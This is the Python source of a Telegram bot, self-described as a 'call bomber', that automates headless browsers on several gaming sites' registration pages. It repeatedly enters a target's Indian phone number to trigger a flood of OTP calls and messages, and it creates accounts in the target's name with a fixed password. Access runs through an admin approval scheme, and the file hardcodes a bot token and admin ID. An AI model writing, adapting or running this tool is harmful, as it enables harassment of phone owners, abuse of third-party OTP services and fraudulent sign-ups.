from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
from playwright.sync_api import sync_playwright
import asyncio
import time

# 🔴 अपना Telegram ID यहाँ डालो
ADMIN_ID = 6192971829
FIXED_PASSWORD = "shy@3343S@45654fyd"
APPROVED_USERS = set()
USER_TASKS = {}

def scroll_page(page):
    # Scroll down and up to make sure elements are visible
    page.mouse.wheel(0, 100)  # Scroll down
    time.sleep(1)
    page.mouse.wheel(0, -50)  # Scroll up slightly
    time.sleep(1)

def trigger_rummycircle_otp_call(phone, user_id):
    while user_id in USER_TASKS:  # Main loop to keep repeating all sites
        with sync_playwright() as p:
            # First Website: bountygame1.com
            browser = p.chromium.launch(headless=True)
            page = browser.new_page(viewport={'width': 360, 'height': 640})
            page.goto("https://bountygame1.com/#/register?invitationCode=145742767323/")
            
            # Scroll to make sure elements are visible
            scroll_page(page)
            
            try:
                page.wait_for_selector('input[placeholder="Please enter the phone number"]', timeout=5000)
                page.fill('input[placeholder="Please enter the phone number"]', phone)
                page.click('text=Send')
                time.sleep(1)
            except Exception as e:
                print(f"Error in bountygame1: {e}")
            finally:
                browser.close()

        if user_id not in USER_TASKS:
            break

        with sync_playwright() as p:
            # Second Website: rajagames7.com
            browser = p.chromium.launch(headless=True)
            page = browser.new_page(viewport={'width': 360, 'height': 640})
            page.goto("https://rajagames7.com/#/register?invitationCode=863622795451/")
            
            # Scroll to make sure elements are visible
            scroll_page(page)
            
            try:
                page.wait_for_selector('input[placeholder="Please enter the phone number"]', timeout=5000)
                page.fill('input[placeholder="Please enter the phone number"]', phone)
                page.click('text=Send')
                time.sleep(1)
            except Exception as e:
                print(f"Error in rajagames7: {e}")
            finally:
                browser.close()

        if user_id not in USER_TASKS:
            break

        with sync_playwright() as p:
            # Third Website: 51game2.in
            browser = p.chromium.launch(headless=True)
            page = browser.new_page(viewport={'width': 360, 'height': 640})
            page.goto("https://51game2.in/#/register?invitationCode=IVfH63804546/")
            
            # Scroll to make sure elements are visible
            scroll_page(page)
            
            try:
                page.wait_for_selector('input[placeholder="Please enter the phone number"]', timeout=5000)
                page.fill('input[placeholder="Please enter the phone number"]', phone)
                page.click('text=Send')
                time.sleep(3)
            except Exception as e:
                print(f"Error in 51game2: {e}")
            finally:
                browser.close()
                
            # Fourth Website: classicrummy.com
            browser = p.chromium.launch(headless=True)
            page = browser.new_page(viewport={"width": 360, "height": 640})
            page.goto("https://www.classicrummy.com/register/")

            try:
                # Fill MOBILE NUMBER
                page.fill('input[placeholder="MOBILE NUMBER"]', phone)
                # Fill PASSWORD
                page.fill('input[placeholder="PASSWORD"]', FIXED_PASSWORD)
                # Click REGISTER button
                page.click('text=REGISTER')
                print("✅ REGISTER clicked")
                time.sleep(1)
            except Exception as e:
                print(f"Error in classicrummy: {e}")
            finally:
                browser.close()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 I am call bomber, send me any Indian number without country code using /request <number>.")

async def request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in APPROVED_USERS:
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return

    if len(context.args) != 1 or not context.args[0].isdigit():
        await update.message.reply_text("⚠️ Usage: /request <10-digit-phone>")
        return

    phone = context.args[0]
    if len(phone) != 10:
        await update.message.reply_text("📵 Please enter a valid 10-digit Indian phone number.")
        return

    keyboard = InlineKeyboardMarkup.from_button(
        InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{user_id}")
    )
    await update.message.reply_text(f"🔥 Bombing started on {phone}", reply_markup=keyboard)

    loop = asyncio.get_event_loop()
    task = loop.run_in_executor(None, trigger_rummycircle_otp_call, phone, user_id)
    USER_TASKS[user_id] = task

async def stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = int(query.data.split("_")[1])
    if user_id in USER_TASKS:
        del USER_TASKS[user_id]
        await query.message.reply_text("✅ Bombing stopped.")
    await query.answer()

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if len(context.args) != 1 or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /approve <user_id>")
        return
    APPROVED_USERS.add(int(context.args[0]))
    await update.message.reply_text("✅ User approved.")

async def disapprove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if len(context.args) != 1 or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /disapprove <user_id>")
        return
    APPROVED_USERS.discard(int(context.args[0]))
    await update.message.reply_text("❌ User disapproved.")

async def help_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    msg = (
        "🛠️ Admin Commands:\n"
        "/approve <user_id> - Approve user\n"
        "/disapprove <user_id> - Remove access\n"
        "/list - Show approved users"
    )
    await update.message.reply_text(msg)

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if not APPROVED_USERS:
        await update.message.reply_text("📭 No approved users.")
    else:
        users = "\n".join(str(uid) for uid in APPROVED_USERS)
        await update.message.reply_text(f"✅ Approved Users:\n{users}")

app = ApplicationBuilder().token("7837361554:AAG1mv64S3eyDwoD4_t2SXwykvEMw3KSH34").build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("request", request))
app.add_handler(CommandHandler("approve", approve))
app.add_handler(CommandHandler("disapprove", disapprove))
app.add_handler(CommandHandler("help", help_admin))
app.add_handler(CommandHandler("list", list_users))
app.add_handler(CallbackQueryHandler(stop_callback, pattern="^stop_"))

app.run_polling()
